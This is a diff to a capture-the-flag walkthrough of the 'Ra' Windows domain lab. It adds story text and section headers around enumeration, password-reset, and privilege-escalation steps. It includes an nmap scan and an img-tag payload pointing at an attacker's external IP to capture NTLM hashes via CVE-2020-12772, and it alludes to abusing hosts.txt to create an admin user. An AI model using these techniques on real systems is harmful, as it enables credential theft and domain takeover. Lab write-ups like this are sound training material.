@@ -13,6 +13,18 @@ Ra - "You have found WindCorp's internal network and their Domain Controller. Ca
 
 **Author:** 4ndr34zz
 
+## Story
+
+You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!).
+
+Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine that may lead you to your end goal. Can you conquer this end boss and own their internal network?
+
+Happy Hacking! 
+
+@4nqr34z and @theart42
+
+## Enumeration
+
 We are given the IP 10.10.51.76, add it to /etc/hosts and run a portscan:
 
 <pre>nmap -p- -A ra.thm -o portscan</pre>
@@ -328,6 +340,8 @@ We are able to reset her password to *ChangeMe#1234*.
 
 This is a great example of how far enumeration can go when collecting information about your target(s). You can imagine how effective Social Enginnering could be in situations like this as well.
 
+## lilyle
+
 These credentials did not work for the openfire service so I started to look for other services from our portscan. 
 
 We can see active directory (ldap) on port 389. Let's try and use these credentials to view the possible shares on this system.
@@ -383,7 +397,9 @@ I came across this interesting article on Github:
 
 [CVE-2020-12772 - Github](https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md)
 
-Sending the following &lt;img&gt; would essentially reveal the NTML hashes of the user that visits the link. 
+## buse
+
+Sending the following &lt;img&gt; would essentially reveal the NTLM hashes of the user that visits the link. 
 
 <pre>&lt;img src=[external_ip]/test.img&gt;</pre>
 
@@ -550,6 +566,8 @@ Refer to this article to understand the different groups:
 
 [Account Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators) group grants limited account creation privileges to a user. This can essentially create and manage users and groups in the domain, including its own membership and that of the Server Operators group.
 
+## brittanycr
+
 So, let's change the password for brittanycr's account. Please note, the password must meet password policy requirements.
 
 Here is the AD password policy:
@@ -579,6 +597,8 @@ google.com
 cisco.com</pre>
 
 Since we couldn't add a user to the Administrator group earlier, maybe we can do this by using the hosts.txt.
+
+## Privilege Escalation - GHANDI
 
 I created a user called "ghandi" with the following command:
 
